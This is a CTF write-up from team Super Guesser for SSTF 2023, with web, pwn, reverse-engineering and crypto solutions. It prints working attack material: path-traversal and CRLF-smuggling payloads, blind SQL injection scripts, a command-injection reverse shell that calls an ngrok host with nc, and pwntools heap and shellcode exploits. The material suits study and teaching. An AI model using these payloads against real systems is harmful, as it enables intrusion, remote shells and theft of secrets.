# SSTF 2023 Write up

Team Super Guesser

## Web

### flagstore

The proxy handling part in nodejs use url.parse once. Becase of this it drops anything after `#`. 
If we put %23 anywhere in the url, anythihng after that will not be send to nginx.

This allows us to bypass /api/_ restriction.

```
curl http://flagstore.sstf.site:8000/api/order/%2e%2e/_secret/keys%23/%2e%2e/%2e%2e/%2e%2e/api/
{"keys":{"JWT_SECRET_KEY":"ASDZFHL.KWLJFYPOJWEPMP3OMXPfJCVJKLWEJL_2"}}
```

after that we can sign arbitrary jwt token with that secret and spoof admin account.

### flagstore2

The idea is to overwrite `$_SESSION["auth_server"]` with our website
1. call login with `auth_server` with our open redirect `http://flagstore2.sstf.site:13337/sso/admin/../../logout.php?return_uri=https://website.com`
2. call callback.php so we control full `$user` & `$res`

```
    $_SESSION["uid"] = $user["sub"] ;
    $_SESSION["username"] = $user["preferred_username"] ;
    $_SESSION["access_token"] = $res["access_token"] ;
    $_SESSION["refresh_token"] = $res["refresh_token"] ;
```

> know when curl receives a 302 redirect it follows the redirect but drops the form data , that's why we need to use **multipart**

3. With CRLF and http request splitting, we can post password ( flag ) into new order 

```
    $password = file_get_contents('/flag', true) ;
    request_resetpassword($AUTH_SERVER, $_SESSION["access_token"], $_SESSION["uid"], $password) ;

```

PS: 
- json payload used in `https://website.com` 

```
{"preferred_username":"admin","access_token":"AA\r\n\r\nPOST /orders.php HTTP/1.1\r\nHost: flagstore2.sstf.site:13337\r\nContent-Type: multipart/form-data; boundary=---------------------------735323031399963166993862151\r\nCookie: PHPSESSID=ihsdcioborim07md00e79jo6bl\r\nContent-Length: 321\r\n\r\n-----------------------------735323031399963166993862151\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","sub":"random"}

```

### RockPaperScissors

```javascript=
function loadStrategy(sgs) {
    for (let sg of sgs) {
      let new_sg = { "move": "", "id": -1, "if": {} };
      for (let key of Object.keys(sg)) {
        if (typeof sg[key] === 'object')
          Object.assign(new_sg[key], sg[key]);
        else
          new_sg[key] = sg[key];
      }
      strategies.push(new_sg);
    }
  }
```

![](https://hackmd.io/_uploads/HJJFEE033.png)
We can do prototype pollution.

my payload

```
{"name":"asdf","strategy":[{"move":"rock","id":0,"if":{"onWin":{"id":1,"move":""},"onLose":{"id":2,"move":""},"onDraw":{"id":3,"move":""}},"__proto__":{"didPlayerWin":1}}]}
```

report bot with callbackURl
```{"url":"/game/play-strategy?strategy_id=64e030e3fcbc4a3290a933be&callbackUrl=https://webhook.site/c45dfd2e-f349-460c-8064-8941bc7ac626"}```

flag : `SCTF{f1nd1ng_pr0t0typ3_p011ut1on_1s_3asy_n0w_f0r_Y0u}`


### Libreria
```php=
case 'requestbook':
		if ((isset($_GET['isbn']) && strlen($_GET['isbn']) >= 10)) {
			$res = '{"res": "Sorry, but our budget is not enough to buy <a href=\'https://isbnsearch.org/isbn/'.$_GET['isbn'].'\'>this book</a>."}';
			$db = dbconnect();
			$result = pg_query($db, "SELECT ISBN FROM books WHERE isbn='".$_GET['isbn']."'");
			pg_close($db);
			if ($result) {
				$rows = pg_fetch_assoc($result);
				if ($rows) {
					$isbn = (int)$rows["isbn"];
					if (($isbn >= 1000000000) && ((string)$isbn === $rows["isbn"]))
					{
						$res = '{"res": "We already have this book('.$rows["isbn"].')."}';
					}
				}
			}
		}
		break;

```

sql injection in this case, we have to match `if (($isbn >= 1000000000) && ((string)$isbn === $rows["isbn"]))` condition. so I used union select and leak with STRING_AGG

```python3=
import requests
import threading
import time

r = requests.session()
url = "http://libreria.sstf.site"
#SCTF{SQL_i5_4_l4n9uage_t0_man4G3_d4ta_1n_Da7aba$e5}
def ex(idx, start, end):
    leak = ""
    for i in range(start,end):
        for j in range(32,128):
            print(j)
            res = r.get(url + f"/rest.php?cmd=requestbook&isbn=-1'+and+1=0+union+select+1000000000+where+ascii(substr((select+STRING_AGG(value,',')+from+adminonly+where+value+like+'%SCTF%'),{str(i)},1))={str(j)}--+-", proxies={"http":"127.0.0.1:8081"})
            if "We already have this book" in res.text:
                leak += chr(j)
                print(leak)
                if "}" in leak:
                    fp = open("./leak/leak"+str(idx), "w")
                    fp.write(leak)
                    fp.close()
                    return None
                break
    fp = open("./leak/leak"+str(idx), "w")
    fp.write(leak)
    fp.close()


  
if __name__ == "__main__":
    t1 = threading.Thread(target=ex, args=(1, 5,10))
    t2 = threading.Thread(target=ex, args=(2, 10,15))
    t3 = threading.Thread(target=ex, args=(3, 15,20))
    t4 = threading.Thread(target=ex, args=(4, 20,25))
    t5 = threading.Thread(target=ex, args=(5, 25,30))
    t6 = threading.Thread(target=ex, args=(6, 30,35))
    t7 = threading.Thread(target=ex, args=(7, 35,40))
    t8 = threading.Thread(target=ex, args=(8, 40,45))
    t9 = threading.Thread(target=ex, args=(9, 45,50))
    t10 = threading.Thread(target=ex, args=(10, 50,55))
    t10 = threading.Thread(target=ex, args=(11, 55,60))
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    t9.start()
    t10.start()
    t11.start()
```

flag : `SCTF{SQL_i5_4_l4n9uage_t0_man4G3_d4ta_1n_Da7aba$e5}`

### Libreria Pro

If we make some erorr on the page, we can leak the source code partially like below.

```python=
    elif search_with == "title":
        search_res = Books.objects.filter(title__icontains=key)
    elif search_with == "author":
        search_res = Books.objects.filter(author__icontains=key)
    elif search_with == "publisher":
        search_res = Books.objects.filter(author__icontains=key)
    elif "year" in search_with or "month" in search_with:
        search_res = Books.objects.annotate(target=Extract('pubdate', search_with)).filter(target=key) …
    elif search_with:
        books['res'] = "error"
    if search_res:
        books = {"books": [book for book in search_res if Books.isValidISBN(book.isbn)][:max_entries]}
```

If you take a look at the code, you can find that  there is `elif "year" in search_with or "month" in search_with:` and it passes to `Extract` annotation directly. It means that you can do SQL Injection if we make some payload including `month` or `year`.

Final payload: `http://libreriapro37657fd3.sstf.site/?key=2000&search_with=month%27%20FROM%20%272021-02-03%2015:23:22.23242%27::timestamp)%20AS%20%22target%22%20FROM%20%22impl_books%22%20union%20select%2031337,concat(value),%273%27,%274%27,%275%27,%276%27,%272021-02-03%2015:23:22.23242%27::timestamp,%279781480864382%27,%279%27,10%20from%20impl_t0p5ecr3t%20%20order%20by%20id%20desc,%20author%20asc%20limit%20100%20offset%200--`

Flag: `SCTF{L3ts_k3Ep_th3_veRs10n_0f_the_fr4mEwOrk_up_to_d4te}`

### Dusty Code

There are a lot of sources given. So, I tried to make sure what is the correct file for the real server. I could decide what is the real with below code using regex - requests combination.

```python=
import requests
import os
import re

dest = os.listdir('./')
r = re.compile("'\/([A-Za-z0-9])*\w+'")

for x in dest:
    if x == "exp.py":
        continue
    f = open(x+"/server/app.js").read()
    res = r.search(f)
    if res:
        conn = requests.get('http://dustycode.sstf.site:3000' + res.group().replace('\'', ''))
        if 'Not' not in conn.text:
            print(conn.text)
            print(x)
```

If you execute above code, you will get `lizard-lib` as a result.

```javascript=
const Hapi = require('@hapi/hapi');
const Joi = require('@hapi/joi');
const regex = require('email-regex')({exact: true});
const { exec } = require("child_process");

const server = Hapi.server({
    port: 3000,
    host: 'localhost'
});

const API_KEY = "binary_glibberish";

server.route({
    method: 'GET',
    path: '/zebra',
    handler: async (request, h) => {
        const { email } = request.query;
        const foo = () => {
            return new Promise((resolve, reject) => {
                decrypt(email, (err, plainEmail) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(plainEmail);
                    }
                })
            });
        };
        const resp = await foo();
        console.log(resp);
        return h.response(resp);
    },
    options: {
        validate: {
            query: Joi.object({
                apiKey: Joi.string().equal(API_KEY).required(),
                email: Joi.string().email().required()
            })
        }
    }
})

function decrypt(encryptedStr, callback) {
    if (encryptedStr && !regex.test(encryptedStr)) {
        try {
            exec('java -cp bin/decryptor.jar com.Main ' + encryptedStr, function(err, stdout, stderr) {
                if (stdout) {
                    let values = stdout.split(':');
                    return callback(null, values[1]);
                } else {
                    return callback(null, encryptedStr);
                }
            })
        } catch(e) {
            return callback(null, encryptedStr);
        }
    } else {
        return callback(null, encryptedStr);
    }
}

(async () => {
    try {
        await server.start();
        console.log(`Server running at: ${server.info.uri}`);
    } catch (error) {
        console.log(error);
        process.exit(1);
    }
})();
```

This is the source code for the page, and we can see there must be Command Injection vulnerability there. We can bypass the regex using backtick or `${}` because it's loose. So, I could get reverse-shell like below.

```http://dustycode.sstf.site:3000/zebra?email=`nc${IFS}2.tcp.ngrok.io${IFS}11253${IFS}-e${IFS}sh`@gmail.com&apiKey=binary_glibberish```

Flag: `SCTF{F1ind1ng_n33d1e_1n_h4ys74ck_a8c312}`

### ColorBit

half of boxes are junk. half are making a flag. those making a flag, are not spreading through all the image, while junk is spread. forced color for "junk" to a static one and got the flag

modified javascript to show me individual boxes on that "apply". seen that some boxes are narrow (i.e. flag), while some are spread through all the image

to get "junk boxes", used this: 
`cat index.html | grep "<div class='box" | head -60000 | grep -Eo 'block[0-9]*' | sort | uniq | sort > junk_blocks.txt`
    
got that `60000` based on manual grep tests
    
The result:
![](https://hackmd.io/_uploads/BJSDouy6h.png)




## Pwn

### 2 Outs in the Ninth Inning

We can inquire arbitrary libc function's address 2 times.
So simply get libc from [libc.rip](https://libc.rip).
Finally get a shell by overwriting the function pointer to oneshot.

```python=
#!/usr/bin/env python3

from pwn import *
import subprocess

local = 0
BIN = "./9end2outs"
IP, PORT = "2outs.sstf.site", 1337

def one_gadget(filename):
    return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def get_libc(local):
    if local:
        return ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        return ELF("./libc.so")

def get_conn(local):
    if local:
        return process(BIN.split())
        # return process(BIN.split(), env={"LD_PRELOAD":""})
    else:
        return remote(IP, PORT)

def main():
    context(terminal=["tmux", "split", "-h"], log_level="debug", aslr=False)
    if not local:
        gdb.attach = lambda *x: None
    p = get_conn(local)
    e = ELF(BIN.split(" ")[0])

    libc = get_libc(local)

    p.sendlineafter(b" > ", b"puts")
    p.recvuntil(b'at ')
    libc.address = int(p.recvuntil(b'.', True), 16) - libc.sym['puts']

    p.sendlineafter(b" > ", b"puts")
    p.sendlineafter(b" > ", p64(libc.address + one_gadget("./libc.so")[3])*2)

    context(log_level="info")
    p.interactive()

if __name__ == "__main__":
    main()
```

### Escape

`open` and `openat` are forbidden, so use `openat2` to bypass seccomp filter.

```python=
#!/usr/bin/env python3

from pwn import *

context(arch='amd64', terminal=['tmux', 'split', '-h'], log_level='debug')
p = remote('escape.sstf.site', 5051)
#p = process('./escape')
context.arch='amd64'

code = b"\x48\x89\xC6\x48\x89\xF2\x48\x31\xFF\x48\x31\xC0\x0F\x05"

cnt = 0
for c in code:
    payload = fmtstr_payload(8, {0x50510010 + cnt: c}, write_size='byte')

    # pause()
    print(payload)
    p.sendlineafter(b': \n', payload)
    cnt += 1

# payload = fmtstr_payload(8, {0x50510b18: 0xff4831c00f05}, write_size='byte')
#gdb.attach(p, 'b *0x50510000')
pause()
p.sendlineafter(b': \n', b'done')

sc = ''
sc += shellcraft.amd64.openat2(-100, 0x50510200, 0x50510180, 0x18)
#sc += shellcraft.amd64.getdents('rax', 0x50510c00, 0x400)
sc += shellcraft.amd64.read('rax', 0x50510c00, 0x400)
sc += shellcraft.amd64.write(1, 0x50510c00, 0x400)
#sc += shellcraft.amd64.open_by_handle_at(-100, 0x50510000, 0x50510000, 0, 0)

sc += shellcraft.amd64.ret()

payload = b''
payload = payload.ljust(0x40, b'\x90')
payload += asm(sc)
payload = payload.ljust(0x200, b'\x00')
payload += b'/flag\0'.ljust(0x40, b'\x00')
context.newline = b'\r\n'
p.send(payload)

context.log_level = 'info'
p.interactive()
```

### Heapster

Since the nodes don't get zeroed on free, we have an uaf primitive. `add` can also be used to edit existing chunks. So, we use this to allocate a chunk in tcache arena to repeatedly overwrite the address of a freed chunk in tcache. We use this to write some valid next sizes on the heap, so that we get a valid `0x601` chunk on the heap, which we then allocate and free to get a libc leak.

We then allocate a chunk into `abs.got` and overwrite it with `system`. Printing the chunks will then execute `/bin/sh`, which we put into one of the nodes.

```python=
#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "heapster.sstf.site"
PORT = 31339
PROCESS = "./chal"

def add(idx, data):
    r.sendline("1")
    r.sendline(str(idx))
    r.send(data)
    r.recvuntil("cmd: ")

def leak():
    r.sendline("3")
    LEAK = r.recvuntil("cmd: ", drop=True)
    return LEAK

def free(idx):
    r.sendline("2")
    r.sendline(str(idx))
    r.recvuntil("cmd: ")

def reveal(fd):
    L = fd >> 36
    for i in range(3):
        temp = (fd >> (36-(i+1)*8)) & 0xff
        element = ((L >> 4) ^ temp) & 0xff
        L = (L << 8) + element
    return L << 12

def exploit(r):
    r.recvuntil("cmd: ")

    # fill some chunks (and write fake 0x601 chunk sizes)
    for i in range(0, 10, 1):
        add(i, "A"*8+p64(0x601))

    # free two chunks to get a "readable" leak
    free(1)
    free(2)

    # leak mangled heap address
    LEAK = u64(leak().split("\n")[1][2:].ljust(8, "\x00"))
    HEAP = reveal(LEAK)
    HEAPGUARD = HEAP >> 12

    log.info("HEAP leak    : %s" % hex(LEAK))
    log.info("HEAP         : %s" % hex(HEAP))
    log.info("HEAPGUARD    : %s" % hex(HEAPGUARD))

    # overwrite freed fd to allocate chunk in tcache
    add(2, p64((HEAP+0x90) ^ HEAPGUARD))

    add(11, "/bin/sh\x00"+p64(0x601))

    # allocate chunk in tcache (12 can now be used to overwrite tcache address)
    add(12, p64(HEAP+0x8e0))

    # write valid "next sizes" on heap
    free(3)                     # free a chunk, to have one freed tcache entry
    add(12, p64(HEAP+0x8e0))    # write target address to tcache
    add(13, p64(0x0)+p64(0x21))  # allocate chunk at target address

    free(4)
    add(12, p64(HEAP+0x8e0+0x20))
    add(14, p64(0x0)+p64(0x21))

    # create a chunk in a fake 0x601 chunk
    free(5)
    add(12, p64(HEAP+0x2f0))
    add(15, p64(0xdeadbeef))

    # free the fake chunk to get libc address on heap
    free(15)

    # leak libc address
    LEAK = u64(leak().split("\n")[7][2:].ljust(8, "\x00"))
    libc.address = LEAK - 0x219ce0
    log.info("LIBC leak     : %s" % hex(LEAK))
    log.info("LIBC          : %s" % hex(libc.address))

    # create a chunk in abs.got
    free(6)
    add(12, p64(libc.address + 0x219090))
    add(16, p64(0xdeadbeef)+p64(libc.symbols["system"]))

    # trigger system in abs.got with /bin/sh chunk
    r.sendline("3")

    r.interactive()

    return


if __name__ == "__main__":
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process("./chal", env={"LD_PRELOAD": "./libc.so.6"})
        print(util.proc.pidof(r))
        pause()

    exploit(r)
```

## Rev

### PlupQuest
In `data.json`, all information for game are exist in it. In `scripts` data, script with id 38 has logic of check input and prints flag. So, we can simply find proper input to value A to P and get flag.

```python=
from z3 import *

def ROL(data, shift, size=8):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)

def boo(a0, b0, c0, d0, e0, f0):
    a8 = a0 ^ b0
    b8 = RotateLeft(a8, b0 % 8)
    a0 = (b8 + e0) & 0xFF
    
    a8 = a0 ^ b0
    b8 = RotateLeft(a8, a0 % 8)
    b0 = (b8 + f0) & 0xFF
    
    a8 = c0 ^ d0
    b8 = RotateLeft(a8, d0 % 8)
    c0 = (b8 + e0) & 0xFF
    
    a8 = c0 ^ d0
    b8 = RotateLeft(a8, c0 % 8)
    d0 = (b8 + f0) & 0xFF
    
    return a0, b0, c0, d0

def foo(A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P):
    B, C, D, A = boo(A, B, C, D, 36, 23)
    F, G, H, E = boo(E, F, G, H, 23, 181)
    J, K, L, I = boo(I, J, K, L, 181, 177)
    N, O, P, M = boo(M, N, O, P, 177, 36)
    
    B, C, D, A = boo(A, B, C, D, 69, 193)
    F, G, H, E = boo(E, F, G, H, 193, 10)
    J, K, L, I = boo(I, J, K, L, 10, 99)
    N, O, P, M = boo(M, N, O, P, 99, 69)
    
    B, C, D, A = boo(A, B, C, D, 246, 149)
    F, G, H, E = boo(E, F, G, H, 149, 183)
    J, K, L, I = boo(I, J, K, L, 183, 75)
    N, O, P, M = boo(M, N, O, P, 75, 246)
    
    B, C, D, A = boo(A, B, C, D, 181, 94)
    F, G, H, E = boo(E, F, G, H, 94, 185)
    J, K, L, I = boo(I, J, K, L, 185, 250)
    N, O, P, M = boo(M, N, O, P, 250, 181)
    
    B, C, D, A = boo(A, B, C, D, 179, 79)
    F, G, H, E = boo(E, F, G, H, 79, 77)
    J, K, L, I = boo(I, J, K, L, 77, 56)
    N, O, P, M = boo(M, N, O, P, 56, 179)
    
    B, C, D, A = boo(A, B, C, D, 107, 54)
    F, G, H, E = boo(E, F, G, H, 54, 201)
    J, K, L, I = boo(I, J, K, L, 201, 203)
    N, O, P, M = boo(M, N, O, P, 203, 107)
    
    B, C, D, A = boo(A, B, C, D, 243, 64)
    F, G, H, E = boo(E, F, G, H, 64, 48)
    J, K, L, I = boo(I, J, K, L, 48, 121)
    N, O, P, M = boo(M, N, O, P, 121, 243)
    
    B, C, D, A = boo(A, B, C, D, 173, 95)
    F, G, H, E = boo(E, F, G, H, 95, 231)
    J, K, L, I = boo(I, J, K, L, 231, 47)
    N, O, P, M = boo(M, N, O, P, 47, 173)
    
    return A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P


s = Solver()
arr = [BitVec("x%d" % i, 8) for i in range(16)]
 
c = [36, 200, 122, 255, 146, 2, 160, 94, 80, 115, 51, 102, 105, 102, 167, 137]

c2 = foo(*arr)

for x, y in zip(c, c2):
    s.add(x == y)

while s.check() == sat:
    
    m = s.model()

    c3 = []
    for i in arr:
        c3.append(int(str(m[i])))

    def baz(A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P):
        return bytes([A ^ 42,  B ^ 18,  C ^ 99,  D ^ 47,
                      E ^ 178, F ^ 170, G ^ 203, H ^ 13,
                      I ^ 122, J ^ 145, K ^ 20,  L ^ 65,
                      M ^ 16,  N ^ 55,  O ^ 180, P ^ 143,
                      A ^ 73,  B ^ 51,  C ^ 91,  D ^ 88,
                      E ^ 167, F ^ 164, G ^ 212, H ^ 73,
                      I ^ 124, J ^ 190, K ^ 17, L ^ 112,
                      M ^ 89, N ^ 57, O ^ 216, P ^ 203,
                      A ^ 38,  B ^ 102,  C ^ 95,  D ^ 90,
                      E ^ 150, F ^ 151, G ^ 138, H ^ 70,
                      I ^ 104, J ^ 145, K ^ 96,  L ^ 88,
                      M ^ 93,  N ^ 61,  O ^ 141, P ^ 196])

    print(baz(*c3))
    s.add(Or([i != s.model()[i] for i in arr]))



```

## Crypto

### meaas

I'm pretty sure that the intended solution is different,, but if modulus $p$ is chosen as smooth prime(means that $p-1$ is product of small primes), then server private exponent is recovered so easily.

```py
from sage.all import *
from Crypto.Util.number import *
import random
from hashlib import sha512

def get_smooth_prime():
	n=142279362596553912224655297226700733514552660689709810513345154350345746185887515861123542614103888301543234469605744615437646435079188336249119463590058020792277090683637455303252433495716397344646744998042450363215302595987117906550802425441792299373794353320390613172040557615261705991448956653912780040873
	Ps = []
	for i in range(3,20):
		if isPrime(i):
			Ps.append(i)

	while True:
		q = 1
		while (2*q+1) < n:
			q *= random.choice(Ps)

		p = 2*q+1
		if p.bit_length() <= 1024 and isPrime(p):
			return p


#p = get_smooth_prime()

p = 177564394785896791822803769012965622938914866311166500731743068467051953178749141747841365717685516883883045117320635478420361013728396068235308051842126037911182851532498747902582221085426709488265931721701568590615845008123377519693494624384026983227745120433306188852272563794304005568847060203552246093751
print("p:", p)

r = primitive_root(p)
print("r:", hex(r))

R = IntegerModRing(p)

# Earned from webpage
exp = 145672519162289878514543885696020201362455730245408703935166878050757421987700323621422405741147350369325348862870353601320166266647424487843498796263932426215472254441741870302355714782612064046747347946779059165323992807081395001106369068751665214250222521004458908066202151974074038763808704750799418320894
exp = R(exp)
d = int(exp.log(R(r)))

### verify d
n=142279362596553912224655297226700733514552660689709810513345154350345746185887515861123542614103888301543234469605744615437646435079188336249119463590058020792277090683637455303252433495716397344646744998042450363215302595987117906550802425441792299373794353320390613172040557615261705991448956653912780040873
e=11035971693989005873759402626999128461666359128625952822750674188152762293240126961360764634990950511241494197654313768345661411938605027938829794598142117
C = pow(2,e,n)
assert pow(C,d,n)==2

treasure=37390385431874189713613604490205529131497857010409452566115943008220420972423103673299513212626382905330650855094314574739903487
print(hex(treasure))
print(sha512(long_to_bytes(d)).digest().hex())

flag = (treasure << (22*4)) ^ bytes_to_long(sha512(long_to_bytes(d)).digest())

print(long_to_bytes(flag))
```

### Crypto Machine

If `dp` is recovered, `n` can be easily factorized by calculating `gcd( pow(c,dp,n) - m, n)` for some plaintext-ciphertext pair `(m,c)`.

(Although it seems not clear,) I assume that the values in `d_p_as_digits` is some kind of permutations of `[0,1,2,..,15]`. Then from `dp_bits`, we can figure out that there are only `30648` candidates instead of `16!`. After testing all candidates, we found that `[11, 8, 14, 1, 9, 5, 13, 10, 4, 15, 2, 3, 12, 0, 7, 6]` is the right mapping and succeed to factorize $n$.

```py
from Crypto.Util.number import *

def string_to_int(s):
    return int.from_bytes(s.encode(encoding="ascii"), byteorder='little')

def int_to_string(i):
    length = (i.bit_length() + 7) // 8
    return i.to_bytes(length, byteorder='little').decode(encoding="ascii")

e = 65537 # = 2^16 + 1
n = 247986593396209875084012131452934099056733647935670515473445992426598899768930823740730826984242067958254605065641483735657759815550540477139432139634638820800423008986789544454729772610227969667760774290284773564029419009020038717859540703507091627999301056310286835600515951248243765130446092120746666876180555284845580231826491442541887612771483752883992273123591778121336015719453085571539280921597192879792417258434207273636582639024556173720065931114200134382018852051071187029307957847828986113074903235247989408426632701126391774984490145343174906256844624326505324922216905289293
flag_enc = 156539305485572699191103505011941122379332151701553059603110690165418795969653170470280711364827383168784090115293778700305550080169460850699540494174149060011762008936085442871933384008015397771403854069510064266983329620117434277066221978735255338346311441103219209899777467779541064732463934404772189243868464339796846862363442127703578646463227851657485689792622948429216331294552860614314283266751264721228761442121952040022067542021305711961849418456816471091404036663730796501797813320194656309206085482726560893004214523505587683373830593170341654010162468594209116725534777579419

dp_bits = "???0??????????????????????????????1???1??????????????????????????????0???1??????????????????????????????1???0??????????????????????????????0???0??????????????????????????????0???1??????????????????????????????0???0??????????????????????????????1???1??????????????????????????????0???1??????????????????????????????0???1??????????????????????????????1???1??????????????????????????????1???0??????????????????????????????0??????????????????????????????????1??????????????????????????????????0??????????????????????????????????0??????????????????????????????????0??????????????????????????????????1??????????????????????????????????1??????????????????????????????????0??????????????????????????????????1??????????????????????????????????1??????????????????????????????????0??????????????????????????????????1??????????????????????????????????0??????????????????????????????????0??????????????????????????????????1??????????????????????????????????0??????????????????????????????1"

d_p_as_digits=[0, 13, 5, 1, 1, 11, 11, 3, 6, 15, 13, 11, 8, 15, 10, 8, 2, 7, 2, 4, 11, 1, 15, 1, 15, 5, 10, 11, 3, 2, 13, 7, 2, 15, 1, 6, 12, 9, 11, 11, 15, 10, 4, 11, 8, 4, 11, 13, 7, 3, 15, 0, 10, 3, 3, 13, 14, 0, 5, 14, 0, 4, 5, 10, 1, 7, 9, 12, 4, 14, 12, 11, 6, 10, 9, 10, 10, 15, 13, 0, 7, 5, 8, 4, 2, 4, 2, 4, 9, 13, 12, 2, 8, 7, 0, 9, 7, 15, 9, 12, 12, 11, 3, 13, 13, 5, 6, 0, 8, 1, 1, 13, 11, 10, 15, 3, 13, 6, 7, 3, 7, 0, 8, 11, 5, 15, 1, 12, 7, 13, 2, 6, 9, 15, 3, 14, 1, 5, 6, 1, 8, 6, 5, 15, 13, 9, 13, 1, 4, 7, 9, 7, 5, 6, 8, 14, 15, 2, 1, 15, 0, 14, 9, 7, 9, 1, 12, 6, 10, 1, 5, 8, 14, 3, 15, 13, 13, 15, 5, 6, 9, 0, 0, 3, 1, 6, 10, 6, 2, 4, 1, 4, 11, 7, 8, 3, 6, 9, 1, 15, 4, 14, 12, 15, 15, 10, 6, 6, 2, 1, 14, 15, 12, 1, 6, 9, 11, 7, 5, 11, 2, 2, 7, 8, 6, 5, 13, 10, 13, 15, 8, 3, 5, 11, 14, 14, 1, 2, 15, 2, 13, 5, 6, 15]
L = len(d_p_as_digits) # 244

dp_bits_slice = [dp_bits[4*i:4*i+4] for i in range(L)][::-1] # reversed
dq_bits_slice = [dq_bits[4*i:4*i+4] for i in range(L)][::-1] # reversed



def string_to_int(s):
    return int.from_bytes(s.encode(encoding="ascii"), byteorder='little')

def int_to_string(i):
    length = (i.bit_length() + 7) // 8
    return i.to_bytes(length, byteorder='little').decode(encoding="ascii")

def check_dp(dp_b, dp_bits):
	#dp_b = bin(dp)[2:].zfill(len(dp_bits))
	for i in range(len(dp_bits)):
		if dp_bits[i] != '?' and dp_bits[i] != dp_b[i]:
			return False
	return True


m = 2
c = pow(m, e, n)

def recover_p(dp):
	mp = pow(c, dp, n)
	g = GCD(mp-m, n)
	if g!=1:
		print(g, n//g)

cands = [set(range(16)) for _ in range(16)]

for i in range(L):
	if dp_bits_slice[i] == '????':
		continue
	new_set = set()
	for x in cands[d_p_as_digits[i]]:
		x_str = bin(x)[2:].zfill(4)
		if matched(x_str, dp_bits_slice[i]):
			new_set.add(x)
	cands[d_p_as_digits[i]] = new_set

# for i in range(L):
# 	if dq_bits_slice[i] == '????':
# 		continue
# 	new_set = set()
# 	for x in cands[d_q_as_digits[i]]:
# 		x_str = bin(x)[2:].zfill(4)
# 		if matched(x_str, dq_bits_slice[i]):
# 			new_set.add(x)
# 	cands[d_q_as_digits[i]] = new_set

go = 1
for i in range(16):
	print(i, len(cands[i]), cands[i])
	go *= len(cands[i])

order = [0,1,15,2,4,13,14,3,5,7,9,11,6,8,10,12]

NUM = 0
L = [-1]*16
def chk(L, idx):
	#print(chk,L,idx)
	if idx == 16:
		global NUM
		NUM+=1
		if NUM % 100 == 0:
			print(str(NUM) + " / 30648")

		if NUM < 12400:
			return None
		dp = sum(16**i * L[d_p_as_digits[i]] for i in range(244))
		print(L)
		recover_p(dp)
		return None


	for x in cands[order[idx]]:
		if x in L:
			continue
		L[order[idx]] = x
		chk(L, idx+1)
		L[order[idx]] = -1

chk(L,0)
print(NUM)


p = 416541034800239426909078476055123175923564047768259484693692313196139456310171868707227883635042072959384245229842532429577638953813839513026730918119761909347776227488132457250280183660547663106250344943925849717528581867409258843604429327212901840551271394231670333348803084043064968687381523
q = 595347331182237061347692817052681611773957447581678972755021305396135991672166078878425800756900446693751359592663038457826236214317841578620119321597623505354261297234533414377268097416007957411658784462114462457802873838204636148813681556004050482640036934572347409577272590176272426287400991
phi = (p-1)*(q-1)
d = pow(e,-1,phi)

m = pow(flag_enc,d,n)
print(int_to_string(m))

#exit()
```